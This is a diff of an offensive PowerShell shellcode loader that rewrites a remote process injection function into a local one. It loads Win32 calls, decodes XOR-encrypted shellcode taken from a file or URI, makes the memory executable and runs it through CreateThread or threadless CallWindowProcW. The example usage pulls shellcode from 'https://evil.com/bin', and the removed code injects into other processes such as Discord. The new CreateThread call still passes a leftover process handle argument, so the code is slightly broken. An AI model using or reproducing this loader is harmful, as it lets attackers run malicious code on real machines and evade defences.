@@ -1,7 +1,7 @@
-﻿function Remote-ProcessInject {
+﻿function Local-ProcessInject {
 #.SYNOPSIS
-# Standalone PowerShell Script for Remote Process Injection (via delegates)
-# Arbitrary Version Number: v1.0.5
+# Standalone PowerShell script for local process injection, supporting threadless execution.
+# Arbitrary Version Number: v1.0.0
 # Author: Tyler McCann (@tylerdotrar)
 #
 #.DESCRIPTION
@@ -10,35 +10,32 @@
 # Works with both Windows PowerShell and PowerShell Core (Pwsh). Using 64-bit PowerShell sessions
 # allows for both 64-bit and 32-bit injection, whereas 32-bit sessions only allow 32-bit injection.
 #
-# Windows API Calls Utilized:
-#  |__ OpenProcess()
-#  |__ VirtualAllocEx()
-#  |__ WriteProcessMemory()
-#  |__ VirtualProtectEx()
-#  |__ CreateRemoteThread() | CallWindowProcW()
+# (Note: might be broken as of new Windows memory protections -- try Remote-ProcessInject instead)
+#
+# Windows API Call(s) Utilized:
+#  |__ VirtualProtect()
+#  |__ CreateThread() | CallWindowProcW()
 #
 # Parameters:
 #   -Shellcode   -->  Shellcode to execute (can be a byte array, string, filepath, or URI).
 #   -XorKey      -->  XOR cipher key for the shellcode (max value: 0xFF).
-#   -TargetPID   -->  Target process PID to inject into.
-#   -Threadless  -->  Use 'CallWindowProcW()' instead of 'CreateRemoteThread()' for local-only threadless execution.
+#   -Threadless  -->  Execute shellcode without creating a new thread (current process will die).
 #   -UseProxy    -->  Attempt to authenticate to the system's default proxy (URI shellcode only).
 #   -Debug       -->  Pause execution and shellcode memory address for process attachment.
 #   -Help        -->  Return Get-Help information.
 #
 # Example Usage:
-#  ________________________________________________________________________________________________________
-# |                                                                                                        |
-# | # Inject shellcode string into the current PowerShell process (and enable debugging)                   |
-# | PS> Remote-ProcessInject -Shellcode $msbox64 -TargetPID $PID -Debug                                    |
-# |                                                                                                        |
-# | # Remote inject shellcode binary into 'Discord.exe'                                                    |
-# | PS> $DiscordPID = (Get-Process -Name Discord).Id | Select -First 1                                     |
-# | PS> Remote-ProcessInject -Shellcode .\calc64.bin -TargetPID $DiscordPID                                |
-# |                                                                                                        |
-# | # Threadless inject the current PowerShell process with XOR encrypted shellcode downloaded from a URI  |
-# | PS> Remote-ProcessInject -Shellcode 'https://evil.com/bin' -XorKey 0x69 -Threadless                    |
-# |________________________________________________________________________________________________________|
+#  ____________________________________________________________________________________________
+# |                                                                                            |
+# | # Inject current PowerShell process and pause execution to attach with a debugger          |
+# | PS> Local-ProcessInject -Shellcode ./calc64.bin -Debug                                     |
+# |                                                                                            |
+# | # Inject current PowerShell process without creating a new thread (will kill the process)  |
+# | PS> Local-ProcessInject -Shellcode ./msgbox64.bin -Threadless                              |
+# |                                                                                            |
+# | # Inject current PowerShell process with XOR encrypted shellcode downloaded from a URI     |
+# | PS> Local-ProcessInject -Shellcode 'https://evil.com/bin' -XorKey 0x69                     |
+# |____________________________________________________________________________________________|
 #
 #.LINK
 # https://github.com/tylerdotrar/ShellcodeLoaderPS
@@ -47,24 +44,20 @@
     Param(
         $Shellcode, # Intentionally vague type for maximum compatibility
         [UInt32]$XorKey,
-        [int]   $TargetPID,
-        [switch]$Threadless,
+        [Switch]$Threadless,
         [switch]$UseProxy,
-        [switch]$Debug,
-        [switch]$Help
+        [Switch]$Debug,
+        [Switch]$Help
     )
 
 
     # Return Get-Help information
-    if ($Help) { return (Get-Help Remote-ProcessInject) }
+    if ($Help) { return (Get-Help Local-ProcessInject) }
 
 
     # Error Correction
     if (!$Shellcode)     { return (Write-Host '[!] Error! Missing shellcode.' -ForegroundColor Red) }
     if ($XorKey -gt 255) { return (Write-Host '[!] Error! XOR key cannot be greater than 0xFF (255).' -ForegroundColor Red) }
-    if ($Threadless)     { $TargetPID = $PID }
-    if (!$TargetPID)     { return (Write-Host '[!] Error! Missing target process PID.' -ForegroundColor Red) }
-    if (!(Get-Process -Id $TargetPID 2>$NULL)) { return (Write-Host "[!] Error! Unable to find process with PID of '${TargetPID}'." -ForegroundColor Red) }
 
 
     # Internal Function(s)
@@ -250,94 +243,38 @@
     function Print-Hex ($Integer) {
         return ('0x{0:x}' -f $Integer)
     }
-    
+
+
     ### Define Required Constant(s) ###
 
-    # Ref: https://learn.microsoft.com/en-us/windows/win32/procthread/process-security-and-access-rights
-    $ProcessAccess = @{
-        PROCESS_ALL_ACCESS        = 0x000F0000 -bor 0x00100000 -bor 0xFFFF; # used
-        PROCESS_CREATE_THREAD     = 0x0002;
-        PROCESS_QUERY_INFORMATION = 0x0400;
-        PROCESS_VM_OPERATION      = 0x0008;
-        PROCESS_VM_READ           = 0x0010;
-        PROCESS_VM_WRITE          = 0x0020;
-    }
-    # Ref: https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc
-    $MemoryAllocation = @{
-        MEM_COMMIT  = 0x00001000; # used
-        MEM_RESERVE = 0x00002000; # used
-    }
     # Ref: https://learn.microsoft.com/en-us/windows/win32/memory/memory-protection-constants
     $MemoryProtection = @{
         PAGE_EXECUTE           = 0x10;
-        PAGE_EXECUTE_READ      = 0x20; #used
+        PAGE_EXECUTE_READ      = 0x20;
         PAGE_READWRITE         = 0x04;
-        PAGE_EXECUTE_READWRITE = 0x40; #used
+        PAGE_EXECUTE_READWRITE = 0x40;
     }
 
 
     ### Load Required Win32 API Call(s) ###
-    
+
     Write-Host '[!] Loading Win32 API Calls...' -ForegroundColor Yellow
 
-    # Remote Process Injection
-    #  |__ OpenProcess()
-    #  |__ VirtualAllocEx()
-    #  |__ WriteProcessMemory()
-    #  |__ VirtualProtectEx()
-    #  |__ CreateRemoteThread() | CallWindowProcW()
+    # Local Process Injection
+    #  |__ VirtualProtect()
+    #  |__ CreateThread() | CallWindowProcW()
 
     Try {
-        $OpenProcArgs = @(
-            [UInt32], # dwDesiredAccess
-            [Bool],   # bInheritHandle
-            [UInt32]  # dwProcessId
-        )
-        $OpenProcess = Load-Win32Function -Library "Kernel32.dll" -FunctionName "OpenProcess" -ParamTypes $OpenProcArgs -ReturnType ([IntPtr])
-
-        $VirtualAllocExArgs = @(
-            [IntPtr], # hProcess
-            [IntPtr], # lpAddress
-            [UInt32], # dwSize
-            [UInt32], # flAllocationType
-            [UInt32]  # flProtect
-        )
-        $VirtualAllocEx = Load-Win32Function -Library "Kernel32.dll" -FunctionName "VirtualAllocEx" -ParamTypes $VirtualAllocExArgs -ReturnType ([IntPtr])
-
-        $WriteProcMemArgs = @(
-            [IntPtr],                # hProcess
-            [IntPtr],                # lpBaseAddress
-            [byte[]],                # lpBuffer
-            [UInt32],                # nSize
-            [UInt32].MakeByRefType() # lpNumberOfBytesWritten
-        )
-        $WriteProcessMemory = Load-Win32Function -Library "Kernel32.dll" -FunctionName "WriteProcessMemory" -ParamTypes $WriteProcMemArgs -ReturnType ([Bool])
-
-        $VirtProtectExArgs = @(
-            [IntPtr],                 #hProcess
+        $VirtProtectArgs = @(
             [IntPtr],                 #lpAddress
             [UInt32],                 # dwSize
             [UInt32],                 # flNewProtect
             [UInt32].MakeByRefType()  # lpflOldProtect
         )
-        $VirtualProtectEx = Load-Win32Function -Library "Kernel32.dll" -FunctionName "VirtualProtectEx" -ParamTypes $VirtProtectExArgs -ReturnType ([Bool])
+        $VirtualProtect = Load-Win32Function -Library "Kernel32.dll" -FunctionName "VirtualProtect" -ParamTypes $VirtProtectArgs -ReturnType ([Bool])
 
-        # Default shellcode execution
-        if (!$Threadless) {
-            $CreateRemThreadArgs = @(
-                [IntPtr],                # hProcess
-                [IntPtr],                # lpThreadAttributes
-                [UInt32],                # dwStackSize
-                [IntPtr],                # lpStartAddress
-                [IntPtr],                # param
-                [UInt32],                # dwCreationFlags
-                [UInt32].MakeByRefType() # lpThreadId
-            )
-            $CreateRemoteThread = Load-Win32Function -Library "Kernel32.dll" -FunctionName "CreateRemoteThread" -ParamTypes $CreateRemThreadArgs -ReturnType ([IntPtr])
-        }
-
-        # Threadless shellcode execution (local inject only)
-        else {
+        # Threadless shellcode execution
+        if ($Threadless) {
             $CallWindowProcArgs = @(
                 [IntPtr], # lpPrevWndFunc
                 [IntPtr], # hWnd
@@ -347,163 +284,86 @@
             )
             $CallWindowProcW = Load-Win32Function -Library "User32.dll" -FunctionName "CallWindowProcW" -ParamTypes $CallWindowProcArgs -ReturnType ([IntPtr])
         }
+        # Default shellcode execution
+        else {
+            $CreateThreadArgs = @(
+                [IntPtr],                # lpThreadAttributes
+                [UInt32],                # dwStackSize
+                [IntPtr],                # lpStartAddress
+                [IntPtr],                # lpParameter
+                [UInt32],                # dwCreationFlags
+                [UInt32].MakeByRefType() # lpThreadId
+            )
+            $CreateThread = Load-Win32Function -Library "Kernel32.dll" -FunctionName "CreateThread" -ParamTypes $CreateThreadArgs -ReturnType ([IntPtr])
+        }
     }
-    Catch { return Generic-Error }
+    Catch { return (Write-Host '[!] Error! Failed to load Win32 API calls.' -ForegroundColor Red) }
 
 
     ### Initialize Key Variables ###
 
     # Parameter Processing
-    $TargetProcess           = Get-Process -Id $TargetPID
     [byte[]]$ShellcodeBuffer = Format-ByteArray $Shellcode -XorKey $XorKey -UseProxy $UseProxy
     if ($ShellcodeBuffer -isnot [byte[]]) { return }
 
 
-    ### (1) Acquire handle to the target process ###
+    ### (1) Allocate Memory Buffer & Copy Shellcode ###
 
-    Write-Host "[!] Acquiring handle to target process..." -ForegroundColor Yellow
-
-    # OpenProcess()
-    #  > Description : Acquire a handle to process.
-    #  > Location    : Kernel32.dll
-    #  > Reference   : https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess
-
-    # Argument(s)
-    $dwDesiredAccess = $ProcessAccess.PROCESS_ALL_ACCESS  # Desired access rights                (i.e., PROCESS_ALL_ACCESS).
-    $bInheritHandle  = $FALSE                       # Created processes inherit the handle (i.e., no -- ignore this).
-    $dwProcessId     = $TargetProcess.Id            # Target process to be opened          (i.e., target process PID).
-    
-    Write-Host ' o  ' -NoNewline ; Write-Host 'OpenProcess()' -ForegroundColor Green
-
-    Try   { $ProcessHandle = $OpenProcess.Invoke($dwDesiredAccess, $bInheritHandle, $dwProcessId) }
+    Write-Host '[!] Writing shellcode to local process buffer...' -ForegroundColor Yellow
+    Try {
+        $ExecPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($ShellcodeBuffer.Length)
+        [System.RunTime.InteropServices.Marshal]::Copy($ShellcodeBuffer, 0, $ExecPtr, $ShellcodeBuffer.Length)
+    }
     Catch { return Generic-Error }
 
-    if ($ProcessHandle -eq 0) { return Win32-Error }
-    Write-Host " o  --> Target Process : $($TargetProcess.ProcessName)"
-    Write-Host " o  --> Target PID     : $($TargetProcess.Id)"
-    Write-host " o  --> Process Handle : $(Print-Hex $ProcessHandle)"
+    Write-Host ' o  ' -NoNewLine ; Write-Host '[System.RuntimeInteropServices.Marshal]' -ForegroundColor Green
+    Write-Host " o  --> Shellcode copied to address : $(Print-Hex $ExecPtr)"
+    Start-Sleep -Seconds 3
 
 
-    ### (2) Allocate memory within target process
-
-    Write-Host "[!] Allocating executable memory within '$($TargetProcess.ProcessName)'..." -ForegroundColor Yellow
-
-    # VirtualAllocEx()
-    #  > Definition : Allocates memory within an external process and returns a pointer to said space.
-    #  > Location   : Kernel32.dll
-    #  > Reference  : https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc
-    
-    # Argument(s)
-    $hProcess         = $ProcessHandle                                                   # Handle to the target process (i.e., acquired from OpenProcess).
-    $lpAddress        = [IntPtr]::Zero                                                   # Starting address in memory to allocate (i.e., if null this is dynamically determined).
-    $dwSize           = $shellcodeBuffer.Length                                          # Size of the memory allocation in bytes.
-    $flAllocationType = $MemoryAllocation.MEM_COMMIT -bor $MemoryAllocation.MEM_RESERVE  # Flags for memory allocation type. 
-    $flProtect        = $MemoryProtection.PAGE_READWRITE                                 # Memory protection flags for the allocated region.
-
-    Write-Host ' o  ' -NoNewline ; Write-Host 'VirtualAllocEx()' -ForegroundColor Green
-
-    Try   { $TargetAddress = $VirtualAllocEx.Invoke($hProcess, $lpAddress, $dwSize, $flAllocationType, $flProtect) }
-    Catch { return Generic-Error }
-    
-    if ($TargetAddress -eq 0) { return Win32-Error }
-    Write-Host " o  --> Allocated Memory Address : $(Print-Hex $TargetAddress)"
-    Write-Host " o  --> Memory Block Size        : ${dwSize} bytes"
-    Write-Host " o  --> Memory Protection        : 0x04 (PAGE_READWRITE)"
-          
-
-    ### (3) Write memory to allocated space
-
-    Write-Host "[!] Writing buffer to allocated memory..." -ForegroundColor Yellow
-
-    # WriteProcessMemory()
-    #  > Definition : Write data to an area of memory within a specified process.
-    #  > Location   : Kernel32.dll
-    #  > Reference  : https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory
-
-    # Argument(s)
-    $hProcess               = $ProcessHandle          # Handle to the target process                       (i.e., acquired from OpenProcess).
-    $lpBaseAddress          = $TargetAddress          # Starting address in memory to begin writing        (i.e., acquired from VirtualAllocEx).
-    $lpBuffer               = $shellcodeBuffer        # Pointer to the memory to copy                      (i.e., target shellcode).
-    $nSize                  = $shellcodeBuffer.Length # Size of the memory to copy                         (i.e., size of the shellcode).
-    $lpNumberOfBytesWritten = 0                       # Output variable to receive number of bytes written (i.e., essentially a throwaway variable).
-    
-    Write-Host ' o  ' -NoNewline ; Write-Host 'WriteProcessMemory()' -ForegroundColor Green
-
-    Try   { $MemoryCopied = $WriteProcessMemory.Invoke($hProcess, $lpBaseAddress, $lpBuffer, $nSize, [ref]$lpNumberOfBytesWritten) }
-    Catch { return Generic-Error }
-
-    if (!$MemoryCopied) { return Win32-Error }
-    Write-Host " o  --> Shellcode Buffer Copied : ${MemoryCopied}"
-
-
-    ### (4) Make Memory Buffer Executable ###
+    ### (2) Set Buffer Protection to PAGE_EXECUTE_READ (0x20) ###
 
     Write-Host '[!] Changing memory buffer protection...' -ForegroundColor Yellow
 
-    # VirtualProtectEx()
-    #  > Definition  :  Changes the protection of a region of memory within a specified process.
+    # VirtualProtect()
+    #  > Definition  :  Changes the protection of a region within local process memory.
     #  > Location    :  Kernel32.dll
     #  > Reference   :  https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect
 
     # Argument(s)
-    $hProcess       = $ProcessHandle                      # Handle to the target process.   
-    $lpAddress      = $TargetAddress                      # Pointer to the starting address in memory to change.
-    $dwSize         = $shellcodeBuffer.Length             # Size of the target memory buffer in bytes.
-    $flNewProtect   = $MemoryProtection.PAGE_EXECUTE_READ # Memory protection flags for the specified region.
-    $lpflOldProtect = 0                                   # Output variable to receive old memory protection flags.
+    $lpAddress      = $ExecPtr                              # Pointer to the starting address in memory to change.
+    $dwSize         = $ShellcodeBuffer.Length               # Size of the target memory buffer in bytes
+    $flNewProtect   = $MemoryProtection.PAGE_EXECUTE_READ   # Memory protection flags for the specified region.
+    $lpflOldProtect = 0                                     # Output variable to receive old memory protection flags.
+    
+    Write-Host ' o  ' -NoNewline; Write-Host 'VirtualProtect()' -ForegroundColor Green
 
-    Write-Host ' o  ' -NoNewline; Write-Host 'VirtualProtectEx()' -ForegroundColor Green
-
-    Try   { $Success = $VirtualProtectEx.Invoke($hProcess, $lpAddress, $dwSize, $flNewProtect, [ref]$lpflOldProtect) }
+    Try   { $Success = $VirtualProtect.Invoke($lpAddress, $dwSize, $flNewProtect, [ref]$lpflOldProtect) }
     Catch { return Generic-Error }
 
     if (!$Success) { return Win32-Error }
-    Write-Host ' o  --> Memory Protection : 0x20 (PAGE_EXECUTE_READ)'
+    Write-Host ' o  --> Memory protection : 0x20 (PAGE_EXECUTE_READ)'
+    Start-Sleep -Seconds 3
 
 
-    ### Optional: Debug Mode to Attach to Process
+    # Optional: Debug Mode to Attach to Process
 
     if ($Debug) {
         
+        $TargetProcess = Get-Process -Id $PID
+
         Write-Host "[x] Debug: " -NoNewline -ForegroundColor Magenta
         Write-Host 'Attach to the ' -NoNewline ; Write-Host "'$($TargetProcess.ProcessName)' ($($TargetProcess.Id))" -ForegroundColor Green -NoNewline ; Write-Host ' instance.'
-        Write-Host ' o  --> Shellcode located at address : ' -NoNewline ; Write-Host $(Print-Hex $TargetAddress) -ForegroundColor Green
+        Write-Host ' o  --> Shellcode located at address : ' -NoNewline ; Write-Host $(Print-Hex $ExecPtr) -ForegroundColor Green
         Write-Host ' o  --> ' -NoNewline ; Write-Host 'PRESS ENTER TO EXECUTE SHELLCODE.' -ForegroundColor Red -NoNewline
         $NULL = Read-Host
     }
+       
+
+    # Step 3: Execution of Shellcode Buffer
 
 
-
-    ### (5) Execute shellcode via a Remote Thread (or local Window Procedure)
-
-    if (!$Threadless) {
-        
-        Write-Host "[!] Executing shellcode..." -ForegroundColor Yellow
-
-        # CreateRemoteThread()
-        #  > Definition  :  Create a thread to execute within the address space of a specfied process.
-        #  > Location    :  Kernel32.dll
-        #  > Reference   :  https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createremotethread
-
-        # Argument(s)
-        $hProcess          = $ProcessHandle        # Handle to the target process                              (i.e., acquired from OpenProcess())
-        $lpThreadAtributes = [IntPtr]::Zero        # Pointer to SECURITY_ATTRIBUTES struct                     (i.e., optional and null by default)
-        $dwStackSize       = 0                     # Initial size of the stack in bytes                        (i.e., 0 means the new thread uses the default size)
-        $lpStartAddress    = $TargetAddress        # Pointer to the memory address to be executed              (i.e., executable shellcode memory address)
-        $param             = [IntPtr]::Zero        # Pointer to a variable to be passed to the thread          (i.e., null pointer means none)
-        $dwCreationFlags   = 0                     # Creation flags of the thread                              (i.e., 0 means the thread runs immediately after creation)
-        $lpThreadId        = 0                     # Pointer to a variable that receives the thread identifier (i.e., 0 for a throwaway variable)
-
-        Write-Host ' o  ' -NoNewline ; Write-Host 'CreateRemoteThread()' -ForegroundColor Green
-
-        Try   { $thread = $CreateRemoteThread.Invoke($hProcess, $lpThreadAtributes, $dwStacksize, $lpStartAddress, $param, $dwCreationFlags, [ref]$lpThreadId) }
-        Catch { return Generic-Error }
-
-        if ($thread -eq 0) { return Win32-Error }
-        Write-Host " o  --> Returned Thread : ${thread}" -NoNewline
-    }
-
-    else {
+    if ($Threadless) {
 
         Write-Host '[!] Executing shellcode (the current process will die)...' -ForegroundColor Yellow
 
@@ -514,7 +374,7 @@
         #  > Reference   :  https://isc.sans.edu/diary/32238
 
         # Argument(s)
-        $lpPrevWndFunc = $TargetAddress   # Pointer to previous window procedure (i.e., executable shellcode memory address)
+        $lpPrevWndFunc = $ExecPtr         # Pointer to previous window procedure (i.e., executable shellcode memory address)
         $hWnd          = [IntPtr]::Zero   # Handle to the window procedure to receive the message
         $Msg           = 0                # Message to process
         $wParam        = 0                # Additional information about the message 
@@ -527,5 +387,32 @@
         Catch { return Generic-Error }
 
         Write-Host " o  --> Return Value : ${result}" # Process will likely die before getting here, but shellcode should have executed.
+    }
+    
+    else {
+        
+        Write-Host '[!] Executing shellcode...' -ForegroundColor Yellow
+
+        # CreateThread()
+        #  > Definition  :  Create a thread to execute within the address space of the current process.
+        #  > Location    :  Kernel32.dll
+        #  > Reference   :  https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createthread
+
+        # Argument(s)
+        $lpThreadAtributes = [IntPtr]::Zero        # Pointer to SECURITY_ATTRIBUTES struct                     (i.e., optional and null by default)
+        $dwStackSize       = 0                     # Initial size of the stack in bytes                        (i.e., 0 means the new thread uses the default size)
+        $lpStartAddress    = $ExecPtr              # Pointer to the memory address to be executed              (i.e., executable shellcode memory address)
+        $param             = [IntPtr]::Zero        # Pointer to a variable to be passed to the thread          (i.e., null pointer means none)
+        $dwCreationFlags   = 0                     # Creation flags of the thread                              (i.e., 0 means the thread runs immediately after creation)
+        $lpThreadId        = 0                     # Pointer to a variable that receives the thread identifier (i.e., 0 for a throwaway variable)
+
+        
+        Write-Host ' o  ' -NoNewline ; Write-Host 'CreateThread()' -ForegroundColor Green
+
+        Try   { $thread = $CreateThread.Invoke($hProcess, $lpThreadAtributes, $dwStacksize, $lpStartAddress, $param, $dwCreationFlags, [ref]$lpThreadId) }
+        Catch { return Generic-Error }
+
+        if ($Thread -eq 0) { return Win32-Error }
+        Write-Host " o  --> Returned Thread : $(Print-Hex $thread)" -NoNewline
     }
 }
